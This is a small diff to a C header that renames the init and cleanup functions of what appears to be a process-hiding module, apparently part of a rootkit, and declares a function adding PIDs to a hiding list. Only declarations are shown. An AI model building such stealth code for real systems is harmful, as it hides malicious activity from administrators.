@@ -2,10 +2,10 @@
 #define PROCHIDER_H
 
 /* initialize proc hider module */
-int prochider_init(void);
+int pidhider_init(void);
 
 /* cleanup proc hider module */
-void prochider_cleanup(void);
+void pidhider_cleanup(void);
 
 /* add pid to hiding list */
 void add_to_pid_list(const char *name, unsigned int len);
